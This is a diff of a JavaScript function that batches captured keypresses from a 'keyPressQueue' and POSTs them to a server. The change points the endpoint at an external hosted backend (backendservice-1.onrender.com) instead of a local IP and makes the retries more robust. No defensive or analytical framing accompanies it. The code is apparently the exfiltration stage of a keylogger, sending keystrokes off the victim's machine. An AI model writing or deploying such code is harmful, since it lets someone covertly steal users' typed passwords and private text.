@@ -23,7 +23,7 @@ async function processQueue() {
   const dataToSend = keyPressQueue.join(''); // Combine all keypresses in the queue
 
   try {
-    const response = await fetch('https://192.168.1.10:3000/data', { // Replace with your server URL
+    const response = await fetch('https://backendservice-1.onrender.com/data', { // Replace with your server URL
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -35,20 +35,25 @@ async function processQueue() {
       throw new Error(`Server error: ${response.status}`);
     }
 
-    const responseData = await response.json();
+    const responseData = await response.text(); // Read the response as plain text
+    console.log('Data sent successfully:', responseData);
 
     keyPressQueue = []; // Clear the queue after successful send
     isSending = false; // Reset the sending flag
     retryCount = 0; // Reset retry count after a successful send
   } catch (error) {
-    // Retry only for network errors or major issues
-    if (retryCount < maxRetries && (error.name === 'TypeError' || error.message.includes('NetworkError'))) {
+    // Retry only for network-related errors
+    if (
+      retryCount < maxRetries &&
+      (error.name === 'TypeError' || error.message.includes('NetworkError') || error.message.includes('Failed to fetch'))
+    ) {
       retryCount++;
       setTimeout(() => {
         isSending = false; // Reset the sending flag to retry
         processQueue(); // Retry sending the data
       }, 5000); // Retry after 5 seconds
     } else {
+      console.error('Error sending data:', error); // Log the error for debugging
       isSending = false; // Reset the sending flag
       retryCount = 0; // Reset retry count
     }
